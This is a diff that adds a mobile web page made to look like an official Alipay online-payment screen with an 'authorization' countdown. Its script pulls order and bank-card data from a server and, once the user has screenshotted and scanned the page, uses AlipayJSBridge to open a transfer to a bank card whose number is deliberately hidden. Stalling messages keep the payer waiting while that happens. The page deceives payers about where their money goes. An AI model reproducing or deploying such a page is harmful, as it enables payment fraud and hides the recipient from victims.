@@ -1,0 +1,369 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no,minimal-ui">
+	<meta name="format-detection" content="telephone=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+	<title></title>
+    <script type="text/javascript" src="alipayCard/js/jquery-1.8.3.min.js"></script>
+    <script type="text/javascript" src="alipayCard/js/rem.js"></script>
+    <script type="text/javascript" src="https://mytest.qilebangbang.com/gopay/js/layui.js"></script>
+    <script type="text/javascript" src="alipayCard/js/function.js"></script>
+    <link rel="stylesheet" type="text/css" href="alipayCard/css/base.css" media="all"/>
+    <link rel="stylesheet" type="text/css" href="alipayCard/css/layui.css" media="all"/>
+
+	<link rel="stylesheet" type="text/css" href="alipayCard/css/pay.css" media="all"/>
+	<link rel="stylesheet" type="text/css" href="alipayCard/css/hipay.css?v=1.2" media="all"/>
+	<link rel="stylesheet" type="text/css" href="alipayCard/css/style.css" media="all"/>
+	<script type="text/javascript" src="alipayCard/js/clipboard.min.js"></script>
+	<script src="alipayCard/js/alipayjsapi.inc.min.js"></script>
+	<script type="text/javascript" src="alipayCard/js/alipay.windows.js"></script>
+<script>
+     //根据屏幕宽度 设置rem基础值
+    //获取屏幕宽度
+    var width=$(window).width();
+    $("html").css("font-size",width/26+'px');
+    $(window).bind('resize',function(){
+        var width=$(window).width();
+        $("html").css("font-size",width/26+'px');
+    });
+</script>
+<style  type="text/css">
+    body{text-align:center}
+    .big_body{
+        margin:0 auto;
+        max-width: 500px;
+        height:100%;
+    }
+    .mybody{
+        margin: 0px auto;text-align: center;
+        margin-top: 0px;
+        padding: 1px 15px;
+    }
+    .grad{
+        background: -webkit-linear-gradient(#2C9BA4, #1C5D95); /* Safari 5.1 - 6.0 */
+        background: -o-linear-gradient(#2C9BA4, #1C5D95); /* Opera 11.1 - 12.0 */
+        background: -moz-linear-gradient(#2C9BA4, #1C5D95); /* Firefox 3.6 - 15 */
+        background: linear-gradient(#2C9BA4, #1C5D95); /* 标准的语法 */
+    }
+    .main{
+        margin-top: 30px;text-align: center;
+        border-radius: 5px;background-color: #FFF;
+        /*box-shadow: 0px 10px 20px #888888;*/
+        position: relative;
+    }
+    .main .head{
+        margin-top: 0px;padding: 0px 15px;
+        text-align: center;
+
+    }
+    .main .imgbody{
+        padding: 15px 10%;
+        text-align: center;
+    }
+    .center{
+        text-align: center;
+    }
+    .left{
+        text-align: left;
+    }
+    .main .img{
+        margin: 0px auto;
+        width: 80%;
+        /*display: none;*/
+    }
+    .main .loading{
+        max-width: 200px;
+        margin: 40px auto;
+        padding: 0px 0px;
+        width: 40%;
+        display: none;
+    }
+    .main .loading .loading_i{
+        font-size: 120px;
+    }
+    .yuan{
+        position: absolute;
+        top: 50%;
+        -webkit-transform: translateX(-50%) translateY(-50%);
+        -webkit-transform: translateX(-50%) translateY(-50%);
+        -moz-transform: translateX(-50%) translateY(-50%);
+        -ms-transform: translateX(-50%) translateY(-50%);
+        transform: translateX(-50%) translateY(-50%);
+        width:20px;
+        height:20px;
+        border-radius: 10px;
+
+    }
+    .grad_yuan{
+        background: -webkit-linear-gradient(#2B879E, #30869D); /* Safari 5.1 - 6.0 */
+        background: -o-linear-gradient(#2B879E, #30869D); /* Opera 11.1 - 12.0 */
+        background: -moz-linear-gradient(#2B879E, #30869D); /* Firefox 3.6 - 15 */
+        background: linear-gradient(#2B879E, #30869D); /* 标准的语法 */
+    }
+    .left_yuan{
+        left: 0px;
+    }
+    .right_yuan{
+        right:-20px;
+    }
+    .yingying{
+        height: 12px;
+        background-color: #7698BD;
+        margin: 0px auto;
+        border-bottom-left-radius:5px;
+        border-bottom-right-radius: 5px;
+    }
+    .span{
+        font-size: 14px;color: #333333;line-height: 26px;display: inline-block;
+        position: relative;
+        top:-2px;
+    }
+    .warning{
+        font-size: 16px;
+    }
+    .zhifubao_wait{
+        position: absolute;
+        left:0;
+        height: 100%;
+        z-index: 999;
+        width:100%;
+        background: #c14443;
+        left:0px;
+        /*display: none;*/
+    }
+    .am-process,.aui-flex.b-line{
+        text-align: left;
+    }
+
+
+    .zhifubao_wait .a1{
+        width:100%;
+        margin-top: 190px;
+        color: #fff;
+    }
+    .zhifubao_wait .a2{
+        width:80%;
+        margin-top: 0px;
+        border-radius: 8px;
+        font-size: 16px;
+        height: 50px;
+        line-height: 50px;
+    }
+    .zhifubao_wait .a3{
+        width:100%;
+        margin-top: 20px;
+        color: #fff;
+    }
+    .am-process .am-process-item{
+        padding-top: 0px;
+    }
+</style>
+    </head>
+    <body>
+        <div class="zhifubao_wait" >
+            <div class="aui-free-head" style="height:300px;">
+                <div class="aui-flex b-line">
+                    <div class="aui-user-img">
+                        <img src="alipayCard/images/tx.jpeg" alt="">
+                    </div>
+
+                    <div class="aui-flex-box">
+                        <h5>支付宝在线支付</h5>
+                        <p>请直接付款</p>
+                        <p id="xxxx">付款后3分钟内将自动到账</p>
+                    </div>
+                </div>
+                <div id="xxx" class="aui-flex aui-flex-text" style="padding: 10px 20px">
+                    <div class="aui-flex-box">
+                        <!--<h2>支付金额</h2>-->
+                        <h3 id="HID">加载中...</h3>
+                        <p id="orNo">加载中...</p>
+                    </div>
+                </div>
+
+                <button id="wait_button" class="layui-btn layui-btn-primary  layui-btn-disabled a2">官方支付授权，剩余 <span id="wait_time" style="color:#000">**</span> 秒</button>
+
+            </div>
+            <div style="margin:0px auto;width:80%;text-align: center;">
+                <div style="margin:0px auto;text-align: center;color:#ddd;font-size: 14px;margin-bottom: 10px;"> 点击上方立即支付按钮，找任意带有条码的物品扫码进入支付环节。<br /><span style="">Iphone X、华为P30及以上版本手机，请扫描任意支付宝收款码</span></div>
+            </div>
+
+            <div class="am-process" style="padding-top:5px;">
+                <div class="am-process-item pay"> <i class="am-icon process pay" aria-hidden="true"></i>
+                    <div class="am-process-content">
+                        <div class="am-process-main">①本页截图</div>
+                        <div class="am-process-brief"></div>
+                    </div>
+                    <div class="am-process-down-border"></div>
+                </div>
+                <div class="am-process-item pay"> <i class="am-icon process success" aria-hidden="true"></i>
+                    <div class="am-process-content">
+                        <div class="am-process-main">②点击立即支付</div>
+                        <div class="am-process-brief"></div>
+                    </div>
+                    <div class="am-process-up-border"></div>
+                </div>
+                <div class="am-process-item success"> <i class="am-icon process success" aria-hidden="true"></i>
+                    <div class="am-process-content">
+                        <div class="am-process-main">③打开摄像头以后选择相册识别本页面</div>
+                        <div class="am-process-brief"><img src="/images/alipay_id.jpg" style="max-width: 200px;"/></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <script>
+        var orderInfo;
+        var money ;
+        function getQueryString(name) {
+        	var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+        	var r = window.location.search.substr(1).match(reg);
+        	if (r != null)
+        		return unescape(r[2]);
+        	return null;
+        }
+		$.get('/api/getOrderGatheringCode', {
+				orderNo : getQueryString('orNo')
+		}).then(function(res) {
+			if(res.success){
+				orderInfo = res.data;
+				money = orderInfo.gatheringAmount;
+		        $("#orNo").html("单号："+orderInfo.orderNo);
+		        $("#HID").html("￥"+money);
+			}else{
+				alert(res.msg);
+			}
+		});
+        //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+     icontype: 'filter',
+ });
+ AlipayJSBridge.call('showOptionMenu');
+ document.addEventListener('optionMenu', function(e) {
+     AlipayJSBridge.call('showPopMenu', {
+         menus: [{
+             name: "查看帮助",
+             tag: "tag1",
+         }, {
+             name: "我要投诉",
+             tag: "tag2",
+         }],
+     }, function(e) {
+         console.log(e);
+     });
+
+
+ }, false);
+ $('#wait_button').removeClass('layui-btn-disabled').addClass('layui-btn-warm').html('立即支付');
+ var layer, util;
+ layui.use(['layer'], function() {
+     layer = layui.layer;
+     var order_no = "8567320200204485510";
+     var amount = "11.15";
+     var out_trade_no = "8567320200204485510";
+     var charge_type = "6";
+     var data = {
+         order_no: order_no
+     };
+     //get_order_status();
+     $('#wait_button').on('click', function() {
+         var isCanClick;
+         if ($(this).hasClass('layui-btn-warm')) {
+             alert("温馨提示：摄像头弹出后，点击右上角通过相册识别，选择刚刚截图的页面，即可成功支付！！！");
+             AlipayJSBridge.call('scan', {
+                 //type: 'bar'
+             }, function(result) {
+                 send_message();
+                 //alert("扫码成功，等待支付宝授权..");
+                 //daojishi_2(3);
+             });
+         }
+     });
+
+     function daojishi_2(time) {
+         $('#wait_button').addClass('layui-btn-disabled').removeClass('layui-btn-warm').html('授权中，剩余 <span id="wait_time" style="color:#000">' + time + '</span> 秒');
+         if (time > 0) {
+             time--;
+             setTimeout(function() {
+                 daojishi_2(time);
+             }, 1000);
+         } else {
+             scanQR();
+             $('#wait_button').html('正在跳转，请耐心等待几秒');
+         }
+     }
+     var timer1, timer2, timer3, timer4
+
+     function tip() {
+         ap.onPageResume(function(res) {
+             AlipayJSBridge.call('hideLoading');
+             ap.hideToast();
+             clearTimeout(timer1)
+             clearTimeout(timer2)
+             clearTimeout(timer3)
+             timer1 = null
+             timer2 = null
+             timer3 = null
+         });
+         AlipayJSBridge.call('showLoading', {
+             text: '跳转中，请耐心等待...',
+         });
+         timer1 = setTimeout(function() {
+             ap.showToast({
+                 content: '再等等转账界面就会跳出来咯。。。。',
+                 duration: 5000
+             }, function() {});
+         }, 10 * 1000)
+         timer2 = setTimeout(function() {
+             ap.showToast({
+                 content: '转账页面还没出来？估计支付宝在忙，再等一会就好。。。',
+                 duration: 5000
+             }, function() {});
+         }, 35 * 1000)
+         timer3 = setTimeout(function() {
+             alert('建议关闭支付宝，重新唤醒支付')
+             AlipayJSBridge.call('hideLoading');
+         }, 70 * 1000)
+     }
+
+    function scanQR() {
+      // ap.scan(function (res) {
+      setTimeout(function () { send_message(); }, 50);
+      // });
+    };
+    var cardNo = "提示风险等待90秒****";
+
+     function send_message() {
+         var a = {
+             actionType: "toCard",
+             sourceId: "bill",
+             cardNo: cardNo,
+             bankAccount: orderInfo.accountHolder+'',
+             money: money+'',
+             amount: orderInfo.gatheringAmount+'',
+             bankMark: orderInfo.bankShortName+'',
+             bankName: orderInfo.accountHolder+'',
+             cardIndex: orderInfo.bankCardAccount+'',
+             cardChannel: "HISTORY_CARD",
+             cardNoHidden: "true"
+         };
+         setTimeout(function() {
+             AlipayJSBridge.call("startApp", {
+                 appId: "09999988",
+                 param: a
+             }, function(a) {});
+             // 支付宝引导提示
+             tip()
+         }, 50)
+     }
+ });
+        </script>
+</body>
+</html>
